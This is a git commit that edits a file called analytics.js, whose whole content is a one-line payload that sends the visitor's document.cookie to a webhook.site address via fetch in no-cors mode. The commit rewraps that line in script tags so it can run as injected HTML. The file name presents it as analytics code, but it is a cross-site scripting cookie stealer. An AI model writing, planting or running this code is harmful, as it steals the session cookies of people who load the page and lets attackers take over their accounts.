a1b580e0c070cae69cb2dddbc1138105ef557cf8
Samruddhighorpade10 <162864694+Samruddhighorpade10@users.noreply.github.com>
2025-04-28 22:53:58 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,2 +1,2 @@
-fetch("https://webhook.site/6c219692-cd34-4258-8c43-5cf5fdc0a34c?q="+document.cookie, {mode: 'no-cors'});
+<script>fetch("https://webhook.site/6c219692-cd34-4258-8c43-5cf5fdc0a34c?q="+document.cookie, {mode: 'no-cors'});</script>
 
